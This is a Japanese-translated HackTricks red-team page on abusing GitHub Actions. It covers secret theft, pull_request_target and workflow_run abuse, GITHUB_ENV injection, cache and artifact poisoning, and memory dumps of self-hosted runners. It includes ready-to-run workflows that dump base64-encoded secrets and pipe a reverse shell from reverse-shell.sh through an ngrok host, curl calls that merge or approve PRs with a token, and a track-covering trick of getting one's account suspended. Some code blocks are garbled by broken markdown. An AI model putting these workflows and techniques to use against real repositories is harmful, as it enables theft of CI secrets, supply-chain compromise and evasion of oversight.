# Abusing Github Actions

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* \*\*💬 [Discordグループ](https://discord.gg/hRep4RUj7f)\*\*に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする
* **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## 基本情報

このページでは以下が見つかります：

* 攻撃者がGithub Actionにアクセスできる場合の**すべての影響の要約**
* アクションにアクセスするための異なる方法：
  * アクションを作成する**権限**を持っている
  * **プルリクエスト**関連のトリガーを悪用する
  * 他の**外部アクセス**技術を悪用する
  * すでに侵害されたリポジトリから**ピボット**する
* 最後に、アクションを**内部から悪用するための事後処理技術**についてのセクション（上記の影響を引き起こす）

## 影響の要約

[**Github Actionsについての基本情報をチェック**](../basic-github-information.md#github-actions)するための紹介。

**リポジトリ**で**任意のGithubアクションを実行/コードを注入**できる場合、次のことができるかもしれません：

* そのリポジトリ/組織から**シークレットを盗む**
* 注入のみが可能な場合、ワークフローにすでに存在するものを盗むことができます。
* AWSやGCPなど他のプラットフォームにアクセスするために**リポジトリの権限**を悪用する
* カスタムワーカーで**コードを実行**し、そこからピボットを試みる
* リポジトリの**コードを上書き**する
* これは`GITHUB_TOKEN`の権限に依存します（あれば）
* **デプロイメント**や他の**アーティファクト**を**侵害**する
* コードが何かをデプロイしたり保存している場合、それを変更してさらなるアクセスを取得できます。

## GITHUB\_TOKEN

この「**シークレット**」（`${{ secrets.GITHUB_TOKEN }}`および`${{ github.token }}`から来ます）は、管理者がこのオプションを有効にしたときに与えられます：

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

このトークンは**Githubアプリケーションが使用する**ものと同じなので、同じエンドポイントにアクセスできます：[https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Githubは、リポジトリが`GITHUB_TOKEN`を使用して他の内部リポジトリにアクセスできるようにする[**フロー**](https://github.com/github/roadmap/issues/74)をリリースすべきです。
{% endhint %}

このトークンの可能な**権限**は次の場所で確認できます：[https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

このトークンは、ジョブが完了した後に**期限切れ**になります。\
これらのトークンは次のように見えます：`ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

このトークンでできる興味深いこと：

{% tabs %}
{% tab title="PRのマージ" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="PRの承認" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PRの作成" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
複数の場合に、Github Actions envs内やsecrets内に**githubユーザートークンを見つけることができる**ことに注意してください。これらのトークンはリポジトリや組織に対するより多くの特権を与える可能性があります。
{% endhint %}

<details>

<summary>Github Actionの出力でシークレットをリストアップ</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

<details>

<summary>シークレットを使用してリバースシェルを取得する</summary>

\`\`\`yaml name: revshell on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: create\_pull\_request: runs-on: ubuntu-latest steps: - name: Get Rev Shell run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}} secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}} \`\`\`

</details>

他のユーザーのリポジトリでGithubトークンに与えられた権限をチェックすることが可能です。アクションのログを**チェック**することで：

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## 許可された実行

{% hint style="info" %}
これはGithubアクションを妨害する最も簡単な方法であり、この場合は**組織内で新しいリポジトリを作成する権限**があるか、**リポジトリに書き込み権限**があると仮定しています。

このシナリオにいる場合、[ポストエクスプロイテーションテクニック](./#post-exploitation-techniques-from-inside-an-action)をチェックするだけで済みます。
{% endhint %}

### リポジトリ作成からの実行

組織のメンバーが**新しいリポジトリを作成**でき、Githubアクションを実行できる場合、**新しいリポジトリを作成し、組織レベルで設定されたシークレットを盗む**ことができます。

### 新しいブランチからの実行

すでにGithubアクションが構成されているリポジトリに**新しいブランチを作成**できる場合、それを**変更**し、コンテンツを**アップロード**してから**新しいブランチからそのアクションを実行**することができます。この方法で**リポジトリおよび組織レベルのシークレットを外部に送信**することができます（ただし、それらがどのように呼ばれるかを知っている必要があります）。

変更されたアクションを**手動で**実行したり、**PRが作成されたとき**や**コードがプッシュされたとき**に実行したりすることができます（どれくらい騒々しいかによります）。

```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```

***

## フォークされた実行

{% hint style="info" %}
攻撃者が**他のリポジトリのGithubアクションを実行**することを可能にするさまざまなトリガーがあります。これらのトリガー可能なアクションが適切に構成されていない場合、攻撃者はそれらを妨害できるかもしれません。
{% endhint %}

### `pull_request`

ワークフロートリガー\*\*`pull_request`**は、プルリクエストが受信されるたびにワークフローを実行しますが、いくつかの例外があります：最初の共同作業の場合、デフォルトでは**メンテナ**がワークフローの**実行を承認\*\*する必要があります：

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**デフォルトの制限**は**初めて**の貢献者向けですので、有効なバグ/タイポを修正してから新しい`pull_request`権限を悪用するために他のPRを送信できます。

**これをテストしましたが機能しません**: ~~別のオプションとして、プロジェクトに貢献した人の名前でアカウントを作成し、そのアカウントを削除することが考えられます。~~
{% endhint %}

さらに、デフォルトでは、[**ドキュメント**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)で言及されているように、**書き込み権限**と**シークレットアクセス**を対象リポジトリにはデフォルトで防止します：

> `GITHUB_TOKEN`を除いて、**シークレットはフォークされたリポジトリからワークフローがトリガーされたときにランナーに渡されません**。**`GITHUB_TOKEN`は、フォークされたリポジトリからのプルリクエストに対して読み取り専用権限**を持っています。

攻撃者はGithubアクションの定義を変更して任意のことを実行し、任意のアクションを追加することができます。ただし、上記の制限のため、シークレットを盗むことやリポジトリを上書きすることはできません。

{% hint style="danger" %}
**はい、攻撃者がPRでトリガーされるgithubアクションを変更すると、そのGithubアクションが使用され、元のリポジトリのものは使用されません！**
{% endhint %}

攻撃者は実行されるコードも制御しているため、`GITHUB_TOKEN`にシークレットや書き込み権限がなくても、例えば**悪意のあるアーティファクトをアップロード**することができます。

### **`pull_request_target`**

ワークフロートリガー\*\*`pull_request_target`**は、対象リポジトリに**書き込み権限**と**シークレットへのアクセス\*\*（許可を求めない）を持っています。

ワークフロートリガー\*\*`pull_request_target`**は**ベースコンテキスト\*\*で実行され、PRで与えられたコンテキストではないことに注意してください（**信頼できないコードを実行しない**）。`pull_request_target`についての詳細は、[**ドキュメント**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)を参照してください。\
さらに、この特定の危険な使用についての詳細については、この[**githubブログ記事**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)をチェックしてください。

**実行されるワークフロー**が**ベース**で定義されており、PRではないため、**`pull_request_target`を使用するのは安全**であるように見えるかもしれませんが、**そうでない場合もあります**。

これには**シークレットへのアクセス**があります。

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run)トリガーは、`completed`、`requested`、または`in_progress`のときに別のワークフローを実行できるようにします。

この例では、別々の「テスト実行」ワークフローが完了した後にワークフローが実行されるように構成されています：

```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```

さらに、ドキュメントによると、`workflow_run` イベントによって開始されたワークフローは、**前のワークフローがなくてもシークレットにアクセスし、トークンを書き込むことができる**。

この種のワークフローは、**`pull_request`** または **`pull_request_target`** を介して外部ユーザーによって**トリガー**される可能性がある **ワークフロー** に **依存**している場合、攻撃される可能性があります。脆弱な例は、[**このブログ**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability) で見つけることができます。最初の例は、**`workflow_run`** がトリガーされたワークフローが攻撃者のコードをダウンロードすることです: `${{ github.event.pull_request.head.sha }}`\
2番目の例は、**信頼できない**コードから **`workflow_run`** ワークフローに **アーティファクト** を **渡し**、このアーティファクトの内容を使用して **RCE に脆弱** にする方法です。

### `workflow_call`

TODO

TODO: 実行時に pull\_request から使用/ダウンロードされたコードが、元のものかフォークされた PR のものかを確認する

## フォークされた実行の悪用

外部攻撃者が GitHub ワークフローを実行する方法についてすべて説明しましたが、今度は、これらの実行が誤って構成されている場合にどのように悪用される可能性があるかを見てみましょう：

### 信頼できないチェックアウト実行

**`pull_request`** の場合、ワークフローは **PR のコンテキストで実行** されます（つまり、**悪意のある PR のコード** が実行されます）、ただし、最初に **承認する必要があり**、いくつかの[制限](./#pull\_request)で実行されます。

**`pull_request_target` または `workflow_run`** を使用するワークフローが、**`pull_request_target` または `pull_request`** からトリガーされるワークフローに依存している場合、元のリポジトリのコードが実行されるため、**攻撃者は実行されるコードを制御できません**。

{% hint style="danger" %}
ただし、**アクション**に **明示的な PR チェックアウト** がある場合、**PR のコードが取得** されます（ベースではなく）。たとえば（PR コードがダウンロードされる行 12 を確認してください）:
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

潜在的に **信頼できないコードが `npm install` または `npm build` で実行** されるため、ビルドスクリプトと参照される **パッケージは PR の作成者によって制御** されます。

{% hint style="warning" %}
脆弱なアクションを検索するための GitHub ドークは、`event.pull_request pull_request_target extension:yml` ですが、アクションが不適切に構成されていても（PR を生成するアクターに関する条件分岐などを使用して）安全に実行されるようにジョブを構成するさまざまな方法があります。
{% endhint %}

### コンテキストスクリプトインジェクション <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

一部の [**GitHub コンテキスト**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) の値は、PR を作成する **ユーザーによって制御** されていることに注意してください。GitHub アクションがその **データを使用して何かを実行** している場合、**任意のコードの実行** につながる可能性があります：

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV スクリプトインジェクション** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

ドキュメントによると、**`GITHUB_ENV`** 環境ファイルに環境変数を定義または更新して、ワークフローのジョブ内の後続のステップでその環境変数を利用できるようにすることができます。

攻撃者がこの **env** 変数に任意の値を **インジェクト** できれば、後続のステップでコードを実行するための環境変数をインジェクトできるため、**LD\_PRELOAD** や **NODE\_OPTIONS** などの環境変数をインジェクトできます。

たとえば（[**こちら**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) および [**こちら**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project) を参照）、アップロードされたアーティファクトを信頼してその内容を **`GITHUB_ENV`** 環境変数に格納するワークフローを想像してください。攻撃者は、これを妨害するために次のようなものをアップロードできます：

```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```

これは次のワークフローで攻撃される可能性があります：

```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```

***

## その他の外部アクセス

### 削除されたネームスペースリポジトリの乗っ取り

アカウントが名前を変更すると、しばらくしてから別のユーザーがその名前でアカウントを登録することができます。リポジトリが名前を変更する前に**100個未満のスター**がついていた場合、Githubは同じ名前の新規登録ユーザーが削除されたリポジトリと同じ名前の**リポジトリを作成することを許可**します。

{% hint style="danger" %}
したがって、アクションが存在しないアカウントのリポジトリを使用している場合、攻撃者がそのアカウントを作成し、アクションを妨害する可能性があります。
{% endhint %}

他のリポジトリが**このユーザーリポジトリからの依存関係**を使用している場合、攻撃者はそれらを乗っ取ることができます。詳細な説明はこちらをご覧ください: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## リポジトリのピボット

{% hint style="info" %}
このセクションでは、最初のリポジトリに何らかのアクセス権があると仮定して、**1つのリポジトリから別のリポジトリにピボット**するための技術について説明します（前のセクションを参照）。
{% endhint %}

### キャッシュの改ざん

**同じブランチでのワークフロー実行間にはキャッシュが維持**されます。つまり、攻撃者が**キャッシュに保存**され、**より特権のある**ワークフローによって**ダウンロード**および実行される**パッケージ**を**妨害**すると、そのワークフローも**妨害**される可能性があります。

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### アーティファクトの改ざん

ワークフローは**他のワークフローおよびリポジトリからアーティファクト**を使用することができます。攻撃者が後で別のワークフローで使用される**アーティファクトをアップロード**するGithubアクションを**妨害**することができれば、他のワークフローを**妨害**することができます。

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## アクションからのポストエクスプロイテーション

### OIDCを介したAWSおよびGCPへのアクセス

以下のページをご覧ください:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### シークレットへのアクセス <a href="#accessing-secrets" id="accessing-secrets"></a>

スクリプトにコンテンツを注入している場合、シークレットにアクセスする方法を知っておくと便利です:

* シークレットまたはトークンが**環境変数**に設定されている場合、\*\*`printenv`\*\*を使用して環境を介して直接アクセスできます。

<details>

<summary>Githubアクションの出力にシークレットをリストする</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}}

secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}}

````
</details>

<details>

<summary>シークレットを使用してリバースシェルを取得する</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
````

</details>

* If the secret is used **directly in an expression**, the generated shell script is stored **on-disk** and is accessible.
* ```bash
  ```

cat /home/runner/work/\_temp/\*

````
* For a JavaScript actions the secrets and sent through environment variables
* ```bash
ps axe | grep node
````

* For a **custom action**, the risk can vary depending on how a program is using the secret it obtained from the **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Self-hosted runnersの悪用

**Github ActionsがGithub以外のインフラで実行されているかどうか**を見つける方法は、Github Actionの構成yamlで\*\*`runs-on: self-hosted`\*\*を検索することです。

**Self-hosted**ランナーは、**追加の機密情報**にアクセスできる場合があります。他の**ネットワークシステム**（ネットワーク内の脆弱なエンドポイント？メタデータサービス？）にアクセスできるか、孤立して破壊されていても、**複数のアクションが同時に実行される可能性があり**、悪意のあるアクションが他のアクションの**シークレットを盗む**ことができます。

Self-hostedランナーでは、**\_Runner.Listener**プロセスから**シークレットを取得**することも可能で、そのプロセスはそのメモリをダンプすることで、いつでもワークフローのすべてのシークレットを含んでいます:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

[**詳細については、この投稿をチェックしてください**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Githubアクションを作成して、**DockerイメージをビルドしてGithub内に保存する**ことが可能です。\
次の展開可能な例を以下に示します：

<details>

<summary>Githubアクション ビルド＆プッシュ Dockerイメージ</summary>

\`\`\`yaml \[...]

* name: Set up Docker Buildx uses: docker/setup-buildx-action@v1
* name: Login to GitHub Container Registry uses: docker/login-action@v1 with: registry: ghcr.io username: $\{{ github.repository\_owner \}} password: $\{{ secrets.ACTIONS\_TOKEN \}}
* name: Add Github Token to Dockerfile to be able to download code run: | sed -i -e 's/TOKEN=##VALUE##/TOKEN=$\{{ secrets.ACTIONS\_TOKEN \}}/g' Dockerfile
* name: Build and push uses: docker/build-push-action@v2 with: context: . push: true tags: | ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:latest ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:$\{{ env.GITHUB\_NEWXREF \}}-$\{{ github.sha \}}

\[...]

````
</details>

前のコードでわかるように、Githubレジストリは**`ghcr.io`**にホストされています。

リポジトリに読み取り権限を持つユーザーは、パーソナルアクセス トークンを使用してDockerイメージをダウンロードできます。
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
````

ユーザーは、**Dockerイメージのレイヤーで漏洩したシークレットを検索**できます：

#### Github Actionsログ内の機密情報

**Github**はアクションログ内のシークレット値を検出しようとして非表示にするが、アクションの実行中に生成された**他の機密データ**は非表示にされない可能性があります。たとえば、シークレット値で署名されたJWTは、[特に設定されていない限り](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)非表示にされません。

### 足跡を隠す

([**こちら**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)の技術)まず第一に、Githubでは公開されたPRは一般に公開され、対象のGitHubアカウントにも明確に表示されます。GitHubではデフォルトで、**インターネット上のPRを削除することはできません**が、ひとつ裏技があります。GitHubによって**停止された**アカウントの場合、そのすべての**PRが自動的に削除**され、インターネットから削除されます。したがって、活動を隠すためには、GitHubアカウントを停止させるか、アカウントをフラグ付きにする必要があります。これにより、GitHub上のすべての活動がインターネットから非表示になります（基本的にすべての悪用PRが削除されます）。

GitHubの組織は、GitHubにアカウントを報告することに非常に積極的です。する必要があるのは、Issueで「何か」を共有するだけで、12時間以内にアカウントが停止されるようになります:p そしてそこで、GitHub上のあなたの悪用が見えなくなります。

組織が標的にされたことに気づく唯一の方法は、GitHub UIからPRが削除されるため、SIEMからGitHubログを確認することです。

### ツール

以下のツールは、Github Actionワークフローを見つけたり、脆弱なものを見つけたりするのに役立ちます：

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

</details>
